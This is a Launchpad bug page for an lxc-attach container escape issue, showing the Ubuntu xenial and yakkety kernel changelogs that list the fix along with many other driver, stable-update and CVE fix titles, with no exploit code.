- Revert "(namespace) vfs: Don't modify inodes with a uid or gid unknown to
the vfs"
- Revert "UBUNTU: SAUCE: (namespace) fuse: Translate ids in posix acl xattrs"
- Revert "UBUNTU: SAUCE: (namespace) posix\_acl: Export
posix\_acl\_fix\_xattr\_userns() to modules"
- Revert "(namespace) vfs: Verify acls are valid within superblock's
s\_user\_ns."
- Revert "(namespace) Revert "UBUNTU: SAUCE: fs: Update posix\_acl support to
handle user namespace mounts""
- Revert "(namespace) fs: Refuse uid/gid changes which don't map into
s\_user\_ns"
- Revert "(namespace) Revert "UBUNTU: SAUCE: fs: Refuse uid/gid changes which
don't map into s\_user\_ns""
- Revert "(namespace) mnt: Move the FS\_USERNS\_MOUNT check into sget\_userns"
linux (4.4.0-49.70) xenial; urgency=low
[ Luis Henriques ]
\* Release Tracking Bug
- LP: #1640921
\* Infiniband driver (kernel module) needed for Azure (LP: #1641139)
- SAUCE: RDMA Infiniband for Windows Azure
- [Config] CONFIG\_HYPERV\_INFINIBAND\_ND=m
- SAUCE: Makefile RDMA infiniband driver for Windows Azure
- [Config] Add hv\_network\_direct.ko to generic inclusion list
- SAUCE: RDMA Infiniband for Windows Azure is dependent on amd64
linux (4.4.0-48.69) xenial; urgency=low
[ Luis Henriques ]
\* Release Tracking Bug
- LP: #1640758
\* lxc-attach to malicious container allows access to host (LP: #1639345)
- Revert "UBUNTU: SAUCE: (noup) ptrace: being capable wrt a process requires
mapped uids/gids"
- (upstream) mm: Add a user\_ns owner to mm\_struct and fix ptrace permission
checks
\* take 'P' command from upstream xmon (LP: #1637978)
- powerpc/xmon: Add xmon command to dump process/task similar to ps(1)
\* zfs: importing zpool with vdev on zvol hangs kernel (LP: #1636517)
- SAUCE: (noup) Update zfs to 0.6.5.6-0ubuntu15
\* I2C touchpad does not work on AMD platform (LP: #1612006)
- pinctrl/amd: Configure GPIO register using BIOS settings
- pinctrl/amd: switch to using a bool for level
\* [LTCTest] vfio\_pci not loaded on Ubuntu 16.10 by default (LP: #1636733)
- [Config] CONFIG\_VFIO\_PCI=y for ppc64el
\* QEMU throws failure msg while booting guest with SRIOV VF (LP: #1630554)
- KVM: PPC: Always select KVM\_VFIO, plus Makefile cleanup
\* Allow fuse user namespace mounts by default in xenial (LP: #1634964)
- (namespace) mnt: Move the FS\_USERNS\_MOUNT check into sget\_userns
- (namespace) Revert "UBUNTU: SAUCE: fs: Refuse uid/gid changes which don't
map into s\_user\_ns"
- (namespace) fs: Refuse uid/gid changes which don't map into s\_user\_ns
- (namespace) Revert "UBUNTU: SAUCE: fs: Update posix\_acl support to handle
user namespace mounts"
- (namespace) vfs: Verify acls are valid within superblock's s\_user\_ns.
- SAUCE: (namespace) posix\_acl: Export posix\_acl\_fix\_xattr\_userns() to modules
- SAUCE: (namespace) fuse: Translate ids in posix acl xattrs
- (namespace) vfs: Don't modify inodes with a uid or gid unknown to the vfs
- (namespace) vfs: Don't create inodes with a uid or gid unknown to the vfs
- (namespace) Revert "UBUNTU: SAUCE: quota: Require that qids passed to
dqget() be valid and map into s\_user\_ns"
- (namespace) Revert "UBUNTU: SAUCE: quota: Convert ids relative to s\_user\_ns"
- (namespace) quota: Ensure qids map to the filesystem
- (namespace) quota: Handle quota data stored in s\_user\_ns in quota\_setxquota
- (namespace) dquot: For now explicitly don't support filesystems outside of
init\_user\_ns
- (namespace) Revert "UBUNTU: SAUCE: ima/evm: Allow root in s\_user\_ns to set
xattrs"
- SAUCE: (namespace) security/integrity: Harden against malformed xattrs
- (namespace) Revert "UBUNTU: SAUCE: fs: Allow superblock owner to change
ownership of inodes with unmappable ids"
- SAUCE: (namespace) fs: Allow superblock owner to change ownership of inodes
- (namespace) Revert "UBUNTU: SAUCE: fs: Don't remove suid for CAP\_FSETID in
s\_user\_ns"
- SAUCE: (namespace) fs: Don't remove suid for CAP\_FSETID for userns root
- SAUCE: (namespace) fuse: Allow user namespace mounts by default
\* [Feature] KBL - New device ID for Kabypoint(KbP) (LP: #1591618)
- SAUCE: mfd: lpss: Fix Intel Kaby Lake PCH-H properties
\* hio: SSD data corruption under stress test (LP: #1638700)
- SAUCE: hio: set bi\_error field to signal an I/O error on a BIO
- SAUCE: hio: splitting bio in the entry of .make\_request\_fn
\* Module sha1-mb fails to load (LP: #1637165)
- crypto: sha-mb - Fix load failure
- crypto: mcryptd - Fix load failure
\* please include mlx5\_core modules in linux-image-generic package
(LP: #1635223)
- [Config] Include mlx5 in main package
\* xgene i2c slimpro driver fails to load (LP: #1625232)
- mailbox: Add support for APM X-Gene platform mailbox driver
- mailbox/xgene-slimpro: Checking for IS\_ERR instead of NULL
- mailbox: xgene-slimpro: Fix wrong test for devm\_kzalloc
- [Config] Enabled XGENE\_SLIMPRO\_MBOX as a module
\* [Dell][XPS]Touchscreen fails to function after resume from s3 by Lid
close/open (LP: #1632527)
- gpio/pinctrl: sunxi: stop poking around in private vars
- pinctrl: intel: Only restore pins that are used by the driver
\* Xenial update to v4.4.30 stable release (LP: #1638272)
- Revert "x86/mm: Expand the exception table logic to allow new handling
options"
- Revert "fix minor infoleak in get\_user\_ex()"
- Linux 4.4.30
\* Xenial update to v4.4.29 stable release (LP: #1638267)
- drm/prime: Pass the right module owner through to dma\_buf\_export()
- drm/amdgpu: fix IB alignment for UVD
- drm/amdgpu/dce10: disable hpd on local panels
- drm/amdgpu/dce8: disable hpd on local panels
- drm/amdgpu/dce11: disable hpd on local panels
- drm/amdgpu/dce11: add missing drm\_mode\_config\_cleanup call
- drm/amdgpu: change vblank\_time's calculation method to reduce computational
error.
- drm/radeon: narrow asic\_init for virtualization
- drm/radeon/si/dpm: fix phase shedding setup
- drm/radeon: change vblank\_time's calculation method to reduce computational
error.
- drm/vmwgfx: Limit the user-space command buffer size
- drm/i915/gen9: fix the WaWmMemoryReadLatency implementation
- Revert "drm/i915: Check live status before reading edid"
- drm/i915: Account for TSEG size when determining 865G stolen base
- drm/i915: Unalias obj->phys\_handle and obj->userptr
- mm/hugetlb: fix memory offline with hugepage size > memory block size
- posix\_acl: Clear SGID bit when setting file permissions
- ipip: Properly mark ipip GRO packets as encapsulated.
- powerpc/eeh: Null check uses of eeh\_pe\_bus\_get
- perf stat: Fix interval output values
- genirq/generic\_chip: Add irq\_unmap callback
- uio: fix dmem\_region\_start computation
- ARM: clk-imx35: fix name for ckil clk
- spi: spi-fsl-dspi: Drop extra spi\_master\_put in device remove function
- mwifiex: correct aid value during tdls setup
- crypto: gcm - Fix IV buffer size in crypto\_gcm\_setkey
- crypto: arm/ghash-ce - add missing async import/export
- hwrng: omap - Only fail if pm\_runtime\_get\_sync returns < 0
- ASoC: topology: Fix error return code in soc\_tplg\_dapm\_widget\_create()
- ASoC: dapm: Fix possible uninitialized variable in snd\_soc\_dapm\_get\_volsw()
- ASoC: dapm: Fix value setting for \_ENUM\_DOUBLE MUX's second channel
- ASoC: dapm: Fix kcontrol creation for output driver widget
- staging: r8188eu: Fix scheduling while atomic splat
- power: bq24257: Fix use of uninitialized pointer bq->charger
- dmaengine: ipu: remove bogus NO\_IRQ reference
- x86/mm: Expand the exception table logic to allow new handling options
- s390/cio: fix accidental interrupt enabling during resume
- s390/con3270: fix use of uninitialised data
- s390/con3270: fix insufficient space padding
- clk: qoriq: fix a register offset error
- clk: divider: Fix clk\_divider\_round\_rate() to use clk\_readl()
- perf hists browser: Fix event group display
- perf symbols: Check symbol\_conf.allow\_aliases for kallsyms loading too
- perf symbols: Fixup symbol sizes before picking best ones
- mpt3sas: Don't spam logs if logging level is 0
- powerpc/nvram: Fix an incorrect partition merge
- ARM: pxa: pxa\_cplds: fix interrupt handling
- Linux 4.4.29
\* KVM: PPC: Book3S HV: Migrate pinned pages out of CMA (LP: #1632045)
- KVM: PPC: Book3S HV: Migrate pinned pages out of CMA
\* Xenial update to v4.4.28 stable release (LP: #1637510)
- gpio: mpc8xxx: Correct irq handler function
- mei: me: add kaby point device ids
- regulator: tps65910: Work around silicon erratum SWCZ010
- clk: imx6: initialize GPU clocks
- PM / devfreq: event: remove duplicate devfreq\_event\_get\_drvdata()
- rtlwifi: Fix missing country code for Great Britain
- mmc: block: don't use CMD23 with very old MMC cards
- mmc: sdhci: cast unsigned int to unsigned long long to avoid unexpeted error
- PCI: Mark Atheros AR9580 to avoid bus reset
- platform: don't return 0 from platform\_get\_irq[\_byname]() on error
- cpufreq: intel\_pstate: Fix unsafe HWP MSR access
- parisc: Increase KERNEL\_INITIAL\_SIZE for 32-bit SMP kernels
- parisc: Fix kernel memory layout regarding position of \_\_gp
- parisc: Increase initial kernel mapping size
- pstore/ramoops: fixup driver removal
- pstore/core: drop cmpxchg based updates
- pstore/ram: Use memcpy\_toio instead of memcpy
- pstore/ram: Use memcpy\_fromio() to save old buffer
- perf intel-pt: Fix snapshot overlap detection decoder errors
- perf intel-pt: Fix estimated timestamps for cycle-accurate mode
- perf intel-pt: Fix MTC timestamp calculation for large MTC periods
- dm: mark request\_queue dead before destroying the DM device
- dm: return correct error code in dm\_resume()'s retry loop
- dm mpath: check if path's request\_queue is dying in activate\_path()
- dm crypt: fix crash on exit
- powerpc/vdso64: Use double word compare on pointers
- powerpc/powernv: Pass CPU-endian PE number to opal\_pci\_eeh\_freeze\_clear()
- powerpc/powernv: Use CPU-endian hub diag-data type in
pnv\_eeh\_get\_and\_dump\_hub\_diag()
- powerpc/powernv: Use CPU-endian PEST in pnv\_pci\_dump\_p7ioc\_diag\_data()
- ubi: Deal with interrupted erasures in WL
- zfcp: fix fc\_host port\_type with NPIV
- zfcp: fix ELS/GS request&response length for hardware data router
- zfcp: close window with unblocked rport during rport gone
- zfcp: retain trace level for SCSI and HBA FSF response records
- zfcp: restore: Dont use 0 to indicate invalid LUN in rec trace
- zfcp: trace on request for open and close of WKA port
- zfcp: restore tracing of handle for port and LUN with HBA records
- zfcp: fix D\_ID field with actual value on tracing SAN responses
- zfcp: fix payload trace length for SAN request&response
- zfcp: trace full payload of all SAN records (req,resp,iels)
- scsi: zfcp: spin\_lock\_irqsave() is not nestable
- fbdev/efifb: Fix 16 color palette entry calculation
- ovl: Fix info leak in ovl\_lookup\_temp()
- ovl: copy\_up\_xattr(): use strnlen
- mb86a20s: fix the locking logic
- mb86a20s: fix demod settings
- cx231xx: don't return error on success
- cx231xx: fix GPIOs for Pixelview SBTVD hybrid
- ALSA: hda - Fix a failure of micmute led when having multi adcs
- MIPS: Fix -mabi=64 build of vdso.lds
- MIPS: ptrace: Fix regs\_return\_value for kernel context
- lib: move strtobool() to kstrtobool()
- lib: update single-char callers of strtobool()
- lib: add "on"/"off" support to kstrtobool
- Input: i8042 - skip selftest on ASUS laptops
- Input: elantech - force needed quirks on Fujitsu H760
- Input: elantech - add Fujitsu Lifebook E556 to force crc\_enabled
- sunrpc: fix write space race causing stalls
- NFSv4: Don't report revoked delegations as valid in nfs\_have\_delegation()
- NFSv4: nfs4\_copy\_delegation\_stateid() must fail if the delegation is invalid
- NFSv4: Open state recovery must account for file permission changes
- NFSv4.2: Fix a reference leak in nfs42\_proc\_layoutstats\_generic
- scsi: Fix use-after-free
- metag: Only define atomic\_dec\_if\_positive conditionally
- mm: filemap: don't plant shadow entries without radix tree node
- ipc/sem.c: fix complex\_count vs. simple op race
- arc: don't leak bits of kernel stack into coredump
- fs/super.c: fix race between freeze\_super() and thaw\_super()
- cifs: Limit the overall credit acquired
- fs/cifs: keep guid when assigning fid to fileinfo
- Clarify locking of cifs file and tcon structures and make more granular
- Display number of credits available
- Set previous session id correctly on SMB3 reconnect
- SMB3: GUIDs should be constructed as random but valid uuids
- Do not send SMB3 SET\_INFO request if nothing is changing
- Cleanup missing frees on some ioctls
- blkcg: Unlock blkcg\_pol\_mutex only once when cpd == NULL
- x86/e820: Don't merge consecutive E820\_PRAM ranges
- kvm: x86: memset whole irq\_eoi
- irqchip/gicv3: Handle loop timeout proper
- sd: Fix rw\_max for devices that report an optimal xfer size
- hpsa: correct skipping masked peripherals
- PKCS#7: Don't require SpcSpOpusInfo in Authenticode pkcs7 signatures
- bnx2x: Prevent false warning for lack of FC NPIV
- net/mlx4\_core: Allow resetting VF admin mac to zero
- acpi, nfit: check for the correct event code in notifications
- mm: workingset: fix crash in shadow node shrinker caused by
replace\_page\_cache\_page()
- mm: filemap: fix mapping->nrpages double accounting in fuse
- Using BUG\_ON() as an assert() is \_never\_ acceptable
- s390/mm: fix gmap tlb flush issues
- irqchip/gic-v3-its: Fix entry size mask for GITS\_BASER
- isofs: Do not return EACCES for unknown filesystems
- memstick: rtsx\_usb\_ms: Runtime resume the device when polling for cards
- memstick: rtsx\_usb\_ms: Manage runtime PM when accessing the device
- arm64: percpu: rewrite ll/sc loops in assembly
- arm64: kernel: Init MDCR\_EL2 even in the absence of a PMU
- ceph: fix error handling in ceph\_read\_iter
- powerpc/mm: Prevent unlikely crash in copro\_calculate\_slb()
- mmc: core: Annotate cmd\_hdr as \_\_le32
- mmc: rtsx\_usb\_sdmmc: Avoid keeping the device runtime resumed when unused
- mmc: rtsx\_usb\_sdmmc: Handle runtime PM while changing the led
- ext4: do not advertise encryption support when disabled
- jbd2: fix incorrect unlock on j\_list\_lock
- ubifs: Fix xattr\_names length in exit paths
- target: Re-add missing SCF\_ACK\_KREF assignment in v4.1.y
- target: Make EXTENDED\_COPY 0xe4 failure return COPY TARGET DEVICE NOT
REACHABLE
- target: Don't override EXTENDED\_COPY xcopy\_pt\_cmd SCSI status code
- Linux 4.4.28
\* Xenial update to v4.4.27 stable release (LP: #1637501)
- serial: 8250\_dw: Check the data->pclk when get apb\_pclk
- btrfs: assign error values to the correct bio structs
- drivers: base: dma-mapping: page align the size when unmap\_kernel\_range
- fuse: listxattr: verify xattr list
- fuse: invalidate dir dentry after chmod
- fuse: fix killing s[ug]id in setattr
- i40e: avoid NULL pointer dereference and recursive errors on early PCI error
- brcmfmac: fix memory leak in brcmf\_fill\_bss\_param
- ASoC: Intel: Atom: add a missing star in a memcpy call
- reiserfs: Unlock superblock before calling reiserfs\_quota\_on\_mount()
- reiserfs: switch to generic\_{get,set,remove}xattr()
- async\_pq\_val: fix DMA memory leak
- scsi: arcmsr: Simplify user\_len checking
- ext4: enforce online defrag restriction for encrypted files
- ext4: reinforce check of i\_dtime when clearing high fields of uid and gid
- ext4: fix memory leak in ext4\_insert\_range()
- ext4: allow DAX writeback for hole punch
- ext4: release bh in make\_indexed\_dir
- dlm: free workqueues after the connections
- vfs: move permission checking into notify\_change() for utimes(NULL)
- cfq: fix starvation of asynchronous writes
- Linux 4.4.27
\* Xenial update to v4.4.26 stable release (LP: #1637500)
- x86/build: Build compressed x86 kernels as PIE
- Linux 4.4.26
\* ISST-LTE:pVM nvme 0000:a0:00.0: iommu\_alloc failed on NVMe card
(LP: #1633128)
- dma-mapping: introduce the DMA\_ATTR\_NO\_WARN attribute
- powerpc: implement the DMA\_ATTR\_NO\_WARN attribute
- nvme: use the DMA\_ATTR\_NO\_WARN attribute
\* CVE-2016-8658
- brcmfmac: avoid potential stack overflow in brcmf\_cfg80211\_start\_ap()
\* Hotkey doesn't work on HP x360 (LP: #1620979)
- gpiolib: Make it possible to exclude GPIOs from IRQ domain
- pinctrl: cherryview: Do not mask all interrupts in probe
- pinctrl: cherryview: Do not add all southwest and north GPIOs to IRQ domain
\* Bad page state in process genwqe\_gunzip pfn:3c275 in the genwqe device
driver (LP: #1559194)
- SAUCE: (noup) Bad page state in process genwqe\_gunzip pfn:3c275 in the
genwqe device driver
\* CVE-2016-7425
- scsi: arcmsr: Buffer overflow in arcmsr\_iop\_message\_xfer()
\* Add ipvlan module to 16.04 kernel (LP: #1634705)
- [Config] Add ipvlan to the generic inclusion list
\* kernel generates ACPI Exception: AE\_NOT\_FOUND, Evaluating \_DOD incorrectly
(LP: #1634607)
- ACPI / video: skip evaluating \_DOD when it does not exist
\* BT still shows off after resume by wireless hotkey (LP: #1634380)
- Bluetooth: btusb: Fix atheros firmware download error
\* ghash-clmulni-intel module fails to load (LP: #1633058)
- crypto: ghash-clmulni - Fix load failure
- crypto: cryptd - Assign statesize properly
\* Xenial update to v4.4.25 stable release (LP: #1634153)
- timekeeping: Fix \_\_ktime\_get\_fast\_ns() regression
- ALSA: ali5451: Fix out-of-bound position reporting
- ALSA: usb-audio: Extend DragonFly dB scale quirk to cover other variants
- ALSA: usb-line6: use the same declaration as definition in header for MIDI
manufacturer ID
- mfd: rtsx\_usb: Avoid setting ucr->current\_sg.status
- mfd: atmel-hlcdc: Do not sleep in atomic context
- mfd: 88pm80x: Double shifting bug in suspend/resume
- mfd: wm8350-i2c: Make sure the i2c regmap functions are compiled
- KVM: PPC: Book3s PR: Allow access to unprivileged MMCR2 register
- KVM: MIPS: Drop other CPU ASIDs on guest MMU changes
- KVM: PPC: BookE: Fix a sanity check
- x86/boot: Fix kdump, cleanup aborted E820\_PRAM max\_pfn manipulation
- x86/irq: Prevent force migration of irqs which are not in the vector domain
- x86/dumpstack: Fix x86\_32 kernel\_stack\_pointer() previous stack access
- ARM: dts: mvebu: armada-390: add missing compatibility string and bracket
- ARM: dts: MSM8064 remove flags from SPMI/MPP IRQs
- ARM: cpuidle: Fix error return code
- ima: use file\_dentry()
- tpm: fix a race condition in tpm2\_unseal\_trusted()
- tpm\_crb: fix crb\_req\_canceled behavior
- Linux 4.4.25
\* backport fwts UEFI test driver to Xenial (LP: #1633506)
- efi: Add efi\_test driver for exporting UEFI runtime service interfaces
- [Config] CONFIG\_EFI\_TEST=m
\* Fix alps driver for multitouch function. (LP: #1633321)
- HID: alps: fix multitouch cursor issue
\* xgene merlin crashes when running as iperf server (LP: #1632739)
- drivers: net: xgene: optimizing the code
- xgene: get\_phy\_device() doesn't return NULL anymore
- drivers: net: xgene: Get channel number from device binding
- drivers: net: xgene: constify xgene\_cle\_ops structure
- drivers: net: xgene: Fix error handling
- drivers: net: xgene: fix IPv4 forward crash
- drivers: net: xgene: fix sharing of irqs
- drivers: net: xgene: fix ununiform latency across queues
- drivers: net: xgene: fix statistics counters race condition
- drivers: net: xgene: fix register offset
- drivers: net: xgene: Separate set\_speed from mac\_init
- drivers: net: xgene: Fix module unload crash - hw resource cleanup
- drivers: net: xgene: Fix module unload crash - change sw sequence
- drivers: net: xgene: Fix module unload crash - clkrst sequence
- drivers: net: phy: xgene: Add MDIO driver
- drivers: net: xgene: Add backward compatibility
- drivers: net: xgene: Enable MDIO driver
- drivers: net: xgene: Use exported functions
- drivers: net: xgene: ethtool: Use phy\_ethtool\_gset and sset
- dtb: xgene: Add MDIO node
- MAINTAINERS: xgene: Add driver and documentation path
- [Config] Enable MDIO\_XGENE as a modules
\* Add support for KabeLake i219-LOM chips (LP: #1632578)
- e1000e: Initial support for KabeLake
-- Luis Henriques <luis.henriques@canonical.com> Thu, 24 Nov 2016 17:56:21 +0000

| Changed in linux (Ubuntu Xenial): | |
| --- | --- |
| **status**: | Fix Committed → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2016-11-30: |  |  | [#65](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/65) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/65/%2Bdownload) (26.6 KiB)

This bug was fixed in the package linux - 4.8.0-28.30

---------------

linux (4.8.0-28.30) yakkety; urgency=low

[ Luis Henriques ]

\* Release Tracking Bug

    - LP: [#1641083](/bugs/1641083)

\* lxc-attach to malicious container allows access to host (LP: [#1639345](/bugs/1639345))

    - Revert "UBUNTU: SAUCE: (noup) ptrace: being capable wrt a process requires

      mapped uids/gids"

    - (upstream) mm: Add a user\_ns owner to mm\_struct and fix ptrace permission

      checks

\* [Feature] AVX-512 new instruction sets (avx512\_4vnniw, avx512\_4fmaps)

    (LP: [#1637526](/bugs/1637526))

    - x86/cpufeature: Add AVX512\_4VNNIW and AVX512\_4FMAPS features

\* zfs: importing zpool with vdev on zvol hangs kernel (LP: [#1636517](/bugs/1636517))

    - SAUCE: (noup) Update zfs to 0.6.5.8-0ubuntu4.1

\* Move some device drivers build from kernel built-in to modules

    (LP: [#1637303](/bugs/1637303))

    - [Config] CONFIG\_TIGON3=m for all arches

    - [Config] CONFIG\_VIRTIO\_BLK=m, CONFIG\_VIRTIO\_NET=m

\* I2C touchpad does not work on AMD platform (LP: [#1612006](/bugs/1612006))

    - pinctrl/amd: Configure GPIO register using BIOS settings

\* guest experiencing Transmit Timeouts on CX4 (LP: [#1636330](/bugs/1636330))

    - powerpc/64: Re-fix race condition between going idle and entering guest

    - powerpc/64: Fix race condition in setting lock bit in idle/wakeup code

\* QEMU throws failure msg while booting guest with SRIOV VF (LP: [#1630554](/bugs/1630554))

    - KVM: PPC: Always select KVM\_VFIO, plus Makefile cleanup

\* [Feature] KBL - New device ID for Kabypoint(KbP) (LP: [#1591618](/bugs/1591618))

    - SAUCE: mfd: lpss: Fix Intel Kaby Lake PCH-H properties

\* hio: SSD data corruption under stress test (LP: [#1638700](/bugs/1638700))

    - SAUCE: hio: set bi\_error field to signal an I/O error on a BIO

    - SAUCE: hio: splitting bio in the entry of .make\_request\_fn

\* cleanup primary tree for linux-hwe layering issues (LP: [#1637473](/bugs/1637473))

    - [Config] switch Vcs-Git: to yakkety repository

    - [Packaging] handle both linux-lts\* and linux-hwe\* as backports

    - [Config] linux-tools-common and linux-cloud-tools-common are one per series

    - [Config] linux-source-\* is in the primary linux namespace

    - [Config] linux-tools -- always suggest the base package

\* SRU: sync zfsutils-linux and spl-linux changes to linux (LP: [#1635656](/bugs/1635656))

    - SAUCE: (noup) Update spl to 0.6.5.8-2, zfs to 0.6.5.8-0ubuntu4 (LP:

      #1635656)

\* [Feature] SKX: perf uncore PMU support (LP: [#1591810](/bugs/1591810))

    - perf/x86/intel/uncore: Add Skylake server uncore support

    - perf/x86/intel/uncore: Remove hard-coded implementation for Node ID mapping

      location

    - perf/x86/intel/uncore: Handle non-standard counter offset

\* [Feature] Purley: Memory Protection Keys (LP: [#1591804](/bugs/1591804))

    - x86/pkeys: Add fault handling for PF\_PK page fault bit

    - mm: Implement new pkey\_mprotect() system call

    - x86/pkeys: Make mprotect\_key() mask off additional vm\_flags

    - x86/pkeys: Allocation/free syscalls

    - x86: Wire up protection keys system calls

    - generic syscalls: Wire up memory protection keys syscalls

    - pkeys: Add details of system call use to Documentation/

    - x86/pkeys: Default to a restrictive init PKRU

    - x86/pkeys: Allow configuration of init\_pkru

    - x86/pkeys: Add self-tests

\* kernel invalid ...

This bug was fixed in the package linux - 4.8.0-28.30
---------------
linux (4.8.0-28.30) yakkety; urgency=low
[ Luis Henriques ]
\* Release Tracking Bug
- LP: #1641083
\* lxc-attach to malicious container allows access to host (LP: #1639345)
- Revert "UBUNTU: SAUCE: (noup) ptrace: being capable wrt a process requires
mapped uids/gids"
- (upstream) mm: Add a user\_ns owner to mm\_struct and fix ptrace permission
checks
\* [Feature] AVX-512 new instruction sets (avx512\_4vnniw, avx512\_4fmaps)
(LP: #1637526)
- x86/cpufeature: Add AVX512\_4VNNIW and AVX512\_4FMAPS features
\* zfs: importing zpool with vdev on zvol hangs kernel (LP: #1636517)
- SAUCE: (noup) Update zfs to 0.6.5.8-0ubuntu4.1
\* Move some device drivers build from kernel built-in to modules
(LP: #1637303)
- [Config] CONFIG\_TIGON3=m for all arches
- [Config] CONFIG\_VIRTIO\_BLK=m, CONFIG\_VIRTIO\_NET=m
\* I2C touchpad does not work on AMD platform (LP: #1612006)
- pinctrl/amd: Configure GPIO register using BIOS settings
\* guest experiencing Transmit Timeouts on CX4 (LP: #1636330)
- powerpc/64: Re-fix race condition between going idle and entering guest
- powerpc/64: Fix race condition in setting lock bit in idle/wakeup code
\* QEMU throws failure msg while booting guest with SRIOV VF (LP: #1630554)
- KVM: PPC: Always select KVM\_VFIO, plus Makefile cleanup
\* [Feature] KBL - New device ID for Kabypoint(KbP) (LP: #1591618)
- SAUCE: mfd: lpss: Fix Intel Kaby Lake PCH-H properties
\* hio: SSD data corruption under stress test (LP: #1638700)
- SAUCE: hio: set bi\_error field to signal an I/O error on a BIO
- SAUCE: hio: splitting bio in the entry of .make\_request\_fn
\* cleanup primary tree for linux-hwe layering issues (LP: #1637473)
- [Config] switch Vcs-Git: to yakkety repository
- [Packaging] handle both linux-lts\* and linux-hwe\* as backports
- [Config] linux-tools-common and linux-cloud-tools-common are one per series
- [Config] linux-source-\* is in the primary linux namespace
- [Config] linux-tools -- always suggest the base package
\* SRU: sync zfsutils-linux and spl-linux changes to linux (LP: #1635656)
- SAUCE: (noup) Update spl to 0.6.5.8-2, zfs to 0.6.5.8-0ubuntu4 (LP:
#1635656)
\* [Feature] SKX: perf uncore PMU support (LP: #1591810)
- perf/x86/intel/uncore: Add Skylake server uncore support
- perf/x86/intel/uncore: Remove hard-coded implementation for Node ID mapping
location
- perf/x86/intel/uncore: Handle non-standard counter offset
\* [Feature] Purley: Memory Protection Keys (LP: #1591804)
- x86/pkeys: Add fault handling for PF\_PK page fault bit
- mm: Implement new pkey\_mprotect() system call
- x86/pkeys: Make mprotect\_key() mask off additional vm\_flags
- x86/pkeys: Allocation/free syscalls
- x86: Wire up protection keys system calls
- generic syscalls: Wire up memory protection keys syscalls
- pkeys: Add details of system call use to Documentation/
- x86/pkeys: Default to a restrictive init PKRU
- x86/pkeys: Allow configuration of init\_pkru
- x86/pkeys: Add self-tests
\* kernel invalid opcode in intel\_powerclamp (LP: #1630774)
- SAUCE: (no-up) thermal/powerclamp: correct cpu support check
\* please include mlx5\_core modules in linux-image-generic package
(LP: #1635223)
- [Config] Include mlx5 in main package
\* [LTCTest] vfio\_pci not loaded on Ubuntu 16.10 by default (LP: #1636733)
- [Config] CONFIG\_VFIO\_PCI=y for ppc64el
\* Yakkety update to v4.8.6 stable release (LP: #1638748)
- drm/vc4: Fix races when the CS reads from render targets.
- drm/prime: Pass the right module owner through to dma\_buf\_export()
- drm/i915/backlight: setup and cache pwm alternate increment value
- drm/i915/backlight: setup backlight pwm alternate increment on backlight
enable
- drm/amdgpu: fix IB alignment for UVD
- drm/amdgpu/dce10: disable hpd on local panels
- drm/amdgpu/dce8: disable hpd on local panels
- drm/amdgpu/dce11: disable hpd on local panels
- drm/amdgpu/dce11: add missing drm\_mode\_config\_cleanup call
- drm/amdgpu: initialize the context reset\_counter in amdgpu\_ctx\_init
- drm/amdgpu: change vblank\_time's calculation method to reduce computational
error.
- drm/radeon: narrow asic\_init for virtualization
- drm/radeon/si/dpm: fix phase shedding setup
- drm/radeon: change vblank\_time's calculation method to reduce computational
error.
- drm/vmwgfx: Limit the user-space command buffer size
- drm/fsl-dcu: fix endian issue when using clk\_register\_divider
- drm/amd/powerplay: fix mclk not switching back after multi-head was disabled
- HID: add quirk for Akai MIDImix.
- drm/i915/skl: Update plane watermarks atomically during plane updates
- drm/i915: Move CRTC updating in atomic\_commit into it's own hook
- drm/i915/skl: Update DDB values atomically with wms/plane attrs
- drm/i915/skl: Don't try to update plane watermarks if they haven't changed
- drm/i915/gen9: only add the planes actually affected by ddb changes
- drm/i915/gen9: fix the WaWmMemoryReadLatency implementation
- drm/i915/gen9: minimum scanlines for Y tile is not always 4
- drm/i915/gen9: fix plane\_blocks\_per\_line on watermarks calculations
- drm/i915/gen9: fix the watermark res\_blocks value
- drm/i915: SAGV is not SKL-only, so rename a few things
- drm/i915: introduce intel\_has\_sagv()
- drm/i915/kbl: KBL also needs to run the SAGV code
- Revert "drm/i915: Check live status before reading edid"
- drm/i915: Account for TSEG size when determining 865G stolen base
- drm/i915/skl: Ensure pipes with changed wms get added to the state
- drm/i915: Allow PCH DPLL sharing regardless of DPLL\_SDVO\_HIGH\_SPEED
- drm/i915: Move long hpd handling into the hotplug work
- drm/i915: Allow DP to work w/o EDID
- drm/i915: Just clear the mmiodebug before a register access
- drm/i915: Unalias obj->phys\_handle and obj->userptr
- posix\_acl: Clear SGID bit when setting file permissions
- rt2x00usb: Fix error return code
- scsi: cxlflash: Remove the device cleanly in the system shutdown path
- genirq/generic\_chip: Add irq\_unmap callback
- coresight: Remove erroneous dma\_free\_coherent in tmc\_probe
- uio: fix dmem\_region\_start computation
- ARM: clk-imx35: fix name for ckil clk
- spi: spi-fsl-dspi: Drop extra spi\_master\_put in device remove function
- i40e: remove a stray unlock
- i40e: fix broken i40e\_config\_rss\_aq function
- mwifiex: correct aid value during tdls setup
- mwifiex: fix failed to reconnect after interface disabled/enabled
- ath10k: Add WMI\_SERVICE\_PERIODIC\_CHAN\_STAT\_SUPPORT wmi service
- ath10k: fix sending frame in management path in push txq logic
- ath10k: fix reporting channel survey data
- ath10k: fix throughput regression in multi client mode
- crypto: marvell - Don't overwrite default creq->state during initialization
- crypto: gcm - Fix IV buffer size in crypto\_gcm\_setkey
- crypto: marvell - Update transformation context for each dequeued req
- crypto: arm/ghash-ce - add missing async import/export
- crypto: ccp - Fix return value check in ccp\_dmaengine\_register()
- hwrng: omap - Only fail if pm\_runtime\_get\_sync returns < 0
- ASoC: topology: Fix error return code in soc\_tplg\_dapm\_widget\_create()
- ASoC: dapm: Fix possible uninitialized variable in snd\_soc\_dapm\_get\_volsw()
- ASoC: dapm: Fix value setting for \_ENUM\_DOUBLE MUX's second channel
- ASoC: dapm: Fix kcontrol creation for output driver widget
- ASoC: sst-bxt-rt298: fix obsoleted initializers for array
- ASoC: sst-bxt-da7219\_max98357a: fix obsoleted initializers for array
- iio: ad5755: fix off-by-one on devnr limit check
- iio: light: us5182d: Add missing error code assignment before test
- staging: android ion/hisi: fix dependencies
- staging: sm750fb: Correctly set CLOCK\_PHASE bit of display controller.
- staging: r8188eu: Fix scheduling while atomic splat
